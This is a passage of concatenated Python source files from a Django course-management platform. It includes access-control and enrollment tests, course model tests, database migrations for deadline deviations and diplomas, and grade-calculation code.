enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        ext_module = CourseModule.objects.create(\n            name=\"Test module\",\n            url=\"test-module\",\n            points_to_pass=10,\n            course_instance=ext_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n        )\n        ext_category = LearningObjectCategory.objects.create(\n            name=\"External test category\",\n            course_instance=ext_instance,\n            points_to_pass=0,\n        )\n        ext_chapter = CourseChapter.objects.create(\n            name=\"External test chapter\",\n            course_module=ext_module,\n            category=ext_category,\n            url='extchapter1',\n        )\n        url = ext_chapter.get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should NOT see the chapter page\n        # (user is not external and the course is visible to external users only)\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n\n    def test_chapter_all_registered(self):\n        url = self.learning_objects[self.all_regist_course_instance.id][0].get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.all_regist_course_instance.id][1]\n        url = '/Course-Url/allregistered/test-module/chapter1/embedexercise/plain/'\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.all_regist_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/allregistered/test-module/normalexercise/')\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the exercise page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_chapter_public(self):\n        url = self.learning_objects[self.public_course_instance.id][0].get_display_url()\n        # anonymous user can open the chapter\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in internal user should see the chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.public_course_instance.id][1]\n        url = '/Course-Url/public/test-module/chapter1/embedexercise/plain/'\n        # anonymous user can open the chapter exercise\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in internal user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter exercise normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.public_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/public/test-module/normalexercise/')\n        # anonymous user can open the exercise\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the exercise page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_submission(self):\n        # submission in the chapter exercise\n        chapter_exercise = self.learning_objects[self.enrolled_course_instance.id][1]\n        submission = self.submissions[chapter_exercise.id][0]\n        url = submission.get_absolute_url()\n        self.assertEqual(url,\n            '/Course-Url/enrolled/test-module/chapter1/embedexercise/submissions/{0}/'.format(\n                submission.id))\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # non-submitter user should not see the submission\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # the submitter should see her submission\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_enroll(self):\n        self.assertTrue(self.enrolled_course_instance.is_enrollable(self.user))\n        self.assertTrue(self.enrolled_course_instance.is_enrollment_open())\n\n        # course instance is hidden from students\n        new_instance = CourseInstance.objects.create(\n            instance_name=\"Hidden course instance\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"hiddencourse\",\n            view_content_to=CourseInstance.VIEW_ACCESS.PUBLIC,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n            visible_to_students=False,\n        )\n        url = new_instance.get_url('enroll')\n        # anonymous user accesses a hidden course: redirect to login\n        response = self.client.post(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n\n        # enrollment closed\n        new_instance.visible_to_students = True\n        new_instance.enrollment_starting_time = self.yesterday\n        new_instance.enrollment_ending_time = self.yesterday + timedelta(hours=1)\n        new_instance.save()\n        url = new_instance.get_url('enroll')\n        self.assertTrue(new_instance.is_enrollable(self.user))\n        self.assertFalse(new_instance.is_enrollment_open())\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        # can open the enrollment page\n        self.assertEqual(response.status_code, 200)\n        # can not enroll\n        response = self.client.post(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n\n    def test_enrollment_exercise(self):\n        instance = self.enrolled_course_instance\n        enroll_exercise = self.learning_objects[instance.id][2]\n        enroll_exercise.status = LearningObject.STATUS.ENROLLMENT\n        enroll_exercise.save()\n        enroll_url = instance.get_url('enroll')\n        exercise_url = reverse('exercise', kwargs={\n            'exercise_path': enroll_exercise.url,\n            'module_slug': enroll_exercise.course_module.url,\n            'instance_slug': enroll_exercise.course_module.course_instance.url,\n            'course_slug': enroll_exercise.course_module.course_instance.course.url,\n        })\n\n        # anonymous may not open the exercise nor enroll\n        response = self.client.post(enroll_url)\n        self.assertRedirects(response, '/accounts/login/?next=' + enroll_url)\n        response = self.client.get(exercise_url)\n        self.assertRedirects(response, '/accounts/login/?next=' + exercise_url)\n        response = self.client.post(exercise_url)\n        self.assertRedirects(response, '/accounts/login/?next=' + exercise_url)\n        # the course has only one enrollment (made in setUp())\n        self.assertEqual(instance.students.count(), 1)\n\n        # logged-in user may open the exercise and submit\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.post(enroll_url)\n        self.assertRedirects(response, exercise_url) # redirects to the enrollment exercise\n        response = self.client.get(exercise_url)\n        self.assertEqual(response.status_code, 200)\n        # Since there is no exercise service running in the unit test environment,\n        # we can not make test submissions to the exercise.\n        success_flag, warnings, students = enroll_exercise.check_submission_allowed(self.user.userprofile)\n        self.assertEqual(success_flag, BaseExercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(len(warnings), 0)\n        instance.enroll_student(self.user)\n        self.assertEqual(instance.students.count(), 2)\n        self.assertTrue(instance.is_student(self.user))\n        self.client.logout()\n\n    def test_enrollment_exercise_external_users(self):\n        # only external users may enroll\n        instance = self.enrolled_course_instance\n        instance.enrollment_audience = CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS\n        instance.save()\n\n        enroll_exercise = self.learning_objects[instance.id][2]\n        enroll_exercise.status = LearningObject.STATUS.ENROLLMENT_EXTERNAL\n        enroll_exercise.save()\n        enroll_url = instance.get_url('enroll')\n        exercise_url = reverse('exercise', kwargs={\n            'exercise_path': enroll_exercise.url,\n            'module_slug': enroll_exercise.course_module.url,\n            'instance_slug': enroll_exercise.course_module.course_instance.url,\n            'course_slug': enroll_exercise.course_module.course_instance.course.url,\n        })\n\n        # internal user may not enroll\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.post(enroll_url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(exercise_url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.post(exercise_url)\n        self.assertEqual(response.status_code, 403)\n        self.assertFalse(instance.is_student(self.user))\n        self.client.logout()\n\n    def tearDown(self):\n        # return previous logging settings\n        logging.disable(logging.NOTSET)\n/n/n/ncourse/tests.py/n/nfrom datetime import timedelta\n\nfrom django.contrib.auth.models import User\nfrom django.urls import reverse\nfrom django.test import TestCase\nfrom django.test.client import Client\nfrom django.utils import timezone\n\nfrom course.models import Course, CourseInstance, CourseHook, CourseModule, \\\n    LearningObjectCategory, StudentGroup\nfrom exercise.models import BaseExercise, Submission\nfrom exercise.exercise_models import LearningObject\n\n\nclass CourseTest(TestCase):\n    def setUp(self):\n        self.client = Client()\n\n        self.user = User(username=\"testUser\")\n        self.user.set_password(\"testPassword\")\n        self.user.save()\n\n        self.grader = User(username=\"grader\", is_staff=True)\n        self.grader.set_password(\"graderPassword\")\n        self.grader.save()\n\n        self.superuser = User(username=\"staff\", is_staff=False, is_superuser=True)\n        self.superuser.set_password(\"staffPassword\")\n        self.superuser.save()\n\n        self.course = Course.objects.create(\n            name=\"test course\",\n            code=\"123456\",\n            url=\"Course-Url\"\n        )\n\n        self.today = timezone.now()\n        self.tomorrow = self.today + timedelta(days=1)\n        self.two_days_from_now = self.tomorrow + timedelta(days=1)\n        self.yesterday = self.today - timedelta(days=1)\n\n        self.past_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 0\",\n            starting_time=self.yesterday,\n            ending_time=self.today,\n            course=self.course,\n            url=\"T-00.1000_d0\"\n        )\n\n        self.current_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 1\",\n            starting_time=self.today,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"T-00.1000_d1\"\n        )\n\n        self.future_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 2\",\n            starting_time=self.tomorrow,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"T-00.1000_d2\"\n        )\n\n        self.hidden_course_instance = CourseInstance.objects.create(\n            instance_name=\"Secret super course\",\n            starting_time=self.tomorrow,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"T-00.1000_hidden\",\n            visible_to_students=False\n        )\n\n        self.course_module = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module\",\n            points_to_pass=10,\n            course_instance=self.current_course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow\n        )\n\n        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module-late\",\n            points_to_pass=50,\n            course_instance=self.current_course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.two_days_from_now,\n            late_submission_penalty=0.2\n        )\n\n        self.learning_object_category = LearningObjectCategory.objects.create(\n            name=\"test category\",\n            course_instance=self.current_course_instance,\n            points_to_pass=5\n        )\n\n        #self.hidden_learning_object_category = LearningObjectCategory.objects.create(\n        #    name=\"hidden category\",\n        #    course_instance=self.current_course_instance\n        #)\n        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)\n\n        self.learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url='l1',\n        )\n\n        self.broken_learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module_with_late_submissions_allowed,\n            category=self.learning_object_category,\n            url='l2',\n        )\n\n        self.base_exercise = BaseExercise.objects.create(\n            name=\"test exercise\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            service_url=\"http://localhost/\",\n            url='b1',\n        )\n\n        self.submission = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.submission.submitters.add(self.user.userprofile)\n\n        self.course_hook = CourseHook.objects.create(\n            hook_url=\"test_hook_url\",\n            course_instance=self.current_course_instance\n        )\n\n    def test_course_instance_open(self):\n        self.assertFalse(self.past_course_instance.is_open())\n        self.assertTrue(self.current_course_instance.is_open())\n        self.assertFalse(self.future_course_instance.is_open())\n\n    def test_course_url(self):\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/\", self.current_course_instance.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_hidden/\", self.hidden_course_instance.get_absolute_url())\n\n    def test_course_staff(self):\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.current_course_instance.assistants.add(self.user.userprofile)\n\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.course.teachers.add(self.user.userprofile)\n\n        self.assertTrue(self.course.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_assistant(self.user))\n        self.assertTrue(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n        self.assertEquals(\"testUser\", self.current_course_instance.get_course_staff_profiles()[0].shortname)\n\n        self.current_course_instance.assistants.clear()\n\n        self.assertTrue(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertTrue(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.course.teachers.clear()\n\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))\n\n    def test_course_instance_submitters(self):\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(1, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n\n        submission2 = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile)\n        submission2.submitters.add(self.user.userprofile)\n\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(1, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n\n        submission3 = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.user.userprofile)\n        submission3.submitters.add(self.grader.userprofile)\n\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(2, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n        self.assertEquals(\"grader\", students[1].shortname)\n\n    def test_course_instance_visibility(self):\n        self.assertTrue(self.current_course_instance.is_visible_to())\n        self.assertFalse(self.hidden_course_instance.is_visible_to())\n        self.assertTrue(self.current_course_instance.is_visible_to(self.user))\n        self.assertFalse(self.hidden_course_instance.is_visible_to(self.user))\n        self.assertTrue(self.current_course_instance.is_visible_to(self.superuser))\n        self.assertTrue(self.hidden_course_instance.is_visible_to(self.superuser))\n\n    def test_course_instance_get_visible(self):\n        open_course_instances = CourseInstance.objects.get_visible()\n        self.assertEqual(3, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n\n        open_course_instances = CourseInstance.objects.get_visible(self.user)\n        self.assertEqual(3, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n\n        open_course_instances = CourseInstance.objects.get_visible(self.superuser)\n        self.assertEqual(4, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n        self.assertTrue(self.hidden_course_instance in open_course_instances)\n\n    def test_course_instance_unicode_string(self):\n        self.assertEquals(\"123456 test course: Fall 2011 day 1\", str(self.current_course_instance))\n        self.assertEquals(\"123456 test course: Secret super course\", str(self.hidden_course_instance))\n\n    def test_course_hook_unicode_string(self):\n        self.assertEquals(\"123456 test course: Fall 2011 day 1 -> test_hook_url\", str(self.course_hook))\n\n    def test_course_module_late_submission_point_worth(self):\n        self.assertEquals(0, self.course_module.get_late_submission_point_worth())\n        self.assertEquals(80, self.course_module_with_late_submissions_allowed.get_late_submission_point_worth())\n\n    def test_course_module_open(self):\n        self.assertFalse(self.course_module.is_open(self.yesterday))\n        self.assertTrue(self.course_module.is_open(self.today))\n        self.assertTrue(self.course_module.is_open())\n        self.assertTrue(self.course_module.is_open(self.tomorrow))\n        self.assertFalse(self.course_module.is_open(self.two_days_from_now))\n\n    def test_course_module_after_open(self):\n        self.assertFalse(self.course_module.is_after_open(self.yesterday))\n        self.assertTrue(self.course_module.is_after_open(self.today))\n        self.assertTrue(self.course_module.is_after_open())\n        self.assertTrue(self.course_module.is_after_open(self.tomorrow))\n        self.assertTrue(self.course_module.is_after_open(self.two_days_from_now))\n\n    def test_course_views(self):\n        response = self.client.get('/no_course/test', follow=True)\n        self.assertEqual(response.status_code, 404)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertTrue(response.redirect_chain)\n        self.assertEqual(response.status_code, 200)\n        self.assertTemplateUsed(response, 'userprofile/login.html')\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get('/no_course/test', follow=True)\n        self.assertEqual(response.status_code, 404)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n\n        self.assertEqual(response.context[\"course\"], self.course)\n        self.assertEqual(response.context[\"instance\"], self.current_course_instance)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertFalse(response.context[\"is_teacher\"])\n\n        response = self.client.get(self.hidden_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 403)\n\n    def test_course_teacher_views(self):\n        url = self.current_course_instance.get_edit_url()\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n\n        self.current_course_instance.assistants.add(self.grader.userprofile)\n        self.client.login(username=\"grader\", password=\"graderPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n        self.assertTrue(response.context[\"is_assistant\"])\n        self.assertFalse(response.context[\"is_teacher\"])\n\n        self.current_course_instance.assistants.clear()\n        self.course.teachers.add(self.grader.userprofile)\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertTrue(response.context[\"is_teacher\"])\n\n        self.client.logout()\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"staff\", password=\"staffPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertTrue(response.context[\"is_teacher\"])\n\n    def test_groups(self):\n        group = StudentGroup(course_instance=self.current_course_instance)\n        group.save()\n        group.members.add(self.user.userprofile,self.grader.userprofile)\n        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,\n            [self.user.userprofile,self.grader.userprofile]), group)\n        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,\n            [self.user.userprofile,self.superuser.userprofile]), None)\n/n/n/ndeviations/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('userprofile', '0002_auto_20150427_1717'),\n    ]\n\n    state_operations = [\n        migrations.CreateModel(\n            name='DeadlineRuleDeviation',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('extra_minutes', models.IntegerField()),\n                ('exercise', models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE)),\n                ('submitter', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='MaxSubmissionsRuleDeviation',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('extra_submissions', models.IntegerField()),\n                ('exercise', models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE)),\n                ('submitter', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='maxsubmissionsruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='deadlineruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n    ]\n\n    operations = [\n        migrations.SeparateDatabaseAndState(state_operations=state_operations)\n    ]\n/n/n/ndeviations/models.py/n/nfrom datetime import timedelta\n\nfrom django.urls import reverse\nfrom django.db import models\n\nfrom exercise.exercise_models import BaseExercise\nfrom userprofile.models import UserProfile\nfrom lib.models import UrlMixin\n\n\nclass SubmissionRuleDeviation(UrlMixin, models.Model):\n    \"\"\"\n    An abstract model binding a user to an exercise stating that there is some\n    kind of deviation from the normal submission boundaries, that is, special\n    treatment related to the submissions of that particular user to that\n    particular exercise.\n\n    If there are many submitters submitting an exercise out of bounds of the\n    default bounds, all of the submitters must have an allowing instance of\n    SubmissionRuleDeviation subclass in order for the submission to be allowed.\n    \"\"\"\n    exercise = models.ForeignKey(BaseExercise, on_delete=models.CASCADE)\n    submitter = models.ForeignKey(UserProfile, on_delete=models.CASCADE)\n\n    class Meta:\n        abstract = True\n        unique_together = [\"exercise\", \"submitter\"]\n\n    def get_url_kwargs(self):\n        return dict(deviation_id=self.id, **self.exercise.course_instance.get_url_kwargs())\n\n\nclass DeadlineRuleDeviation(SubmissionRuleDeviation):\n    extra_minutes = models.IntegerField()\n    without_late_penalty = models.BooleanField(default=True)\n\n    class Meta(SubmissionRuleDeviation.Meta):\n        pass\n\n    def get_extra_time(self):\n        return timedelta(minutes=self.extra_minutes)\n\n    def get_new_deadline(self):\n        return self.get_normal_deadline() + self.get_extra_time()\n\n    def get_normal_deadline(self):\n        return self.exercise.course_module.closing_time\n\n\nclass MaxSubmissionsRuleDeviation(SubmissionRuleDeviation):\n    extra_submissions = models.IntegerField()\n\n    class Meta(SubmissionRuleDeviation.Meta):\n        pass\n/n/n/ndiploma/grade.py/n/nfrom copy import copy\n\n\ndef calculate_grade(total_points, point_limits, pad_points):\n    points = total_points['points']\n    d_points = copy(total_points['points_by_difficulty'])\n\n    def pass_limit(bound):\n        if isinstance(bound, list):\n            ds,ls = zip(*bound)\n            for i,d in enumerate(ds):\n\n                if pad_points:\n                    p = d_points.get(d, 0)\n                    l = ls[i]\n                    if p < l:\n                        for j in range(i + 1, len(ds)):\n                            jd = ds[j]\n                            jp = d_points.get(jd, 0)\n                            if jp > l - p:\n                                d_points[jd] -= l - p\n                                d_points[d] = l\n                                break\n                            else:\n                                p += jp\n                                d_points[d] = p\n                                d_points[jd] = 0\n                    else:\n                        continue\n\n                if d_points.get(d, 0) < ls[i]:\n                    return False\n\n            return True\n        else:\n            return points >= bound\n\n    grade = 0\n    for bound in point_limits:\n        if pass_limit(bound):\n            grade += 1\n        else:\n            break\n    return grade\n\n\ndef assign_grade(cached_points, diploma_design):\n\n    if not (diploma_design and cached_points.user.is_authenticated):\n        return -1\n\n    if not diploma_design.course.is_course_staff(cached_points.user):\n        avail = diploma_design.availability\n        opt = diploma_design.USERGROUP\n        external = cached_points.user.userprofile.is_external\n        if (\n            (avail == opt.EXTERNAL_USERS and not external)\n            or (avail == opt.INTERNAL_USERS and external)\n        ):\n            return -1\n\n    def is_passed(model):\n        entry,_,_,_ = cached_points.find(model)\n        return entry['passed']\n    if not all(is_passed(m) for m in diploma_design.modules_to_pass.all()):\n        return 0\n    if not all(is_passed(e) for e in diploma_design.exercises_to_pass.all()):\n        return 0\n\n    return calculate_grade(\n        cached_points.total(),\n        diploma_design.point_limits,\n        diploma_design.pad_points\n    )\n/n/n/ndiploma/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.db.models.deletion\nimport diploma.models\nimport lib.models\nimport lib.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0024_auto_20160919_1951'),\n        ('course', '0030_auto_20160912_1341'),\n        ('userprofile', '0003_auto_20160728_1139'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseDiplomaDesign',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('logo', models.ImageField(null=True, blank=True, upload_to=diploma.models.build_upload_dir)),\n                ('title', models.TextField(blank=True)),\n                ('body', models.TextField(blank=True)),\n                ('date', models.CharField(max_length=256)),\n                ('signature_name', models.CharField(blank=True, max_length=256)),\n                ('signature_title', models.CharField(blank=True, max_length=256)),\n                ('small_print', models.TextField(blank=True)),\n                ('point_limits', lib.fields.JSONField(blank=True, help_text='A list of length 5 where each element is the required points for n:th grade.The element can be a list of 2-tuples [[difficulty_level_a, points],[difficulty_level_b, points]].')),\n                ('pad_points', models.BooleanField(help_text='If difficulty levels are used the lower level can be padded with higher level points.', default=False)),\n                ('course', models.OneToOneField(on_delete=django.db.models.deletion.SET_NULL, to='course.CourseInstance', null=True)),\n                ('exercises_to_pass', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),\n                ('modules_to_pass', models.ManyToManyField(blank=True, to='course.CourseModule')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='StudentDiploma',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('created', models.DateTimeField(auto_now=True)),\n                ('hashkey', models.CharField(unique=True, max_length=32)),\n                ('name', models.CharField(max_length=255)),\n                ('grade', models.PositiveIntegerField(default=0)),\n                ('design', models.ForeignKey(to='diploma.CourseDiplomaDesign', on_delete=models.CASCADE)),\n                ('profile', models.ForeignKey(on_delete=django.db.models.deletion.SET_NULL, to='userprofile.UserProfile', null=True)),\n            ],\n            options={\n            },\n            bases=(lib.models.UrlMixin, models.Model),\n        ),\n    ]\n/n/n/ndiploma/templatetags/diploma.py/n/nfrom django import template\nfrom django.urls import reverse\n\nfrom exercise.templatetags.exercise import _prepare_context\nfrom ..grade import assign_grade\nfrom ..models import CourseDiplomaDesign\n\n\nregister = template.Library()\n\n\n@register.inclusion_tag(\"diploma/_diploma_button.html\", takes_context=True)\ndef diploma_button(context, student=None):\n    points = _prepare_context(context, student)\n    design = CourseDiplomaDesign.objects.filter(course=points.instance).first()\n    url = None\n    if design and points.user.is_authenticated:\n        url = reverse('diploma-create', kwargs={\n            'coursediploma_id': design.id,\n            'userprofile_id': points.user.userprofile.id,\n        })\n    return {\n        'grade': assign_grade(points, design),\n        'url': url,\n        'is_course_staff': context.get('is_course_staff'),\n    }\n/n/n/nedit_course/templatetags/editcourse.py/n/nfrom django import template\nfrom django.urls import reverse\n\nfrom course.models import CourseInstance\n\n\nregister = template.Library()\n\n\ndef _normal_kwargs(instance, model_name, **extra_kwargs):\n    